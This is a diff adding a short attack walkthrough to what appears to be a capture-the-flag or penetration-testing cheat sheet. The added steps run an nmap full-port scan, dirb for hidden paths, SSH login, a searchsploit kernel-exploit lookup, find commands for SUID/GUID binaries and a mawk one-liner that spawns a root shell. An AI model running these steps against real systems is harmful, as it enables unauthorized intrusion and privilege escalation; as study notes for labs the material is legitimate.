@@ -50,6 +50,39 @@ Tools: OpenSSL, Cryptool, John the Ripper, Hashcat, Cryptohaze
 Reverse Engineering:
 Tools: Ghidra, IDA Pro, Radare2, OllyDbg, Binary Ninja
 
+=========================================================================================
+If the target has no protection and the IP is given:
+
+nmap [targetIP] -v -Pn -p-
+  port 80
+  port 23
+
+open web browser -> plug in IPaddress -> inspect source code
+
+DIRB to look for hidden files -> type in "dirb http://[targetIP]
+  look for /admin, notes.txt, /robot.txt, 
+
+Try to ssh -> ssh username@targetIP > hit enter > type password 
+
+once in look for known exploit > uname -a > to see kernel version > use searchploit > 
+type "searchploit OS X.X.X-X" > wait for result and exploit accordingly
+
+look for binaries SUID, GUID > use the SUID > look for mawk 
+# Find SUID 
+  find / -perm -u=s -type f 2>/dev/null 
+# Find GUID 
+  find / -perm -g=s -type f 2>/dev/null
+
+use mawk > mawk 'BEGIN {system("/bin/sh")}' > if you see that pound '#' sign, you are now root
+
+navigate throught it > ls > cd /root > ls > keep using ls and cd till you find the juice
+
+
+
+
+
+
+
 
 
 
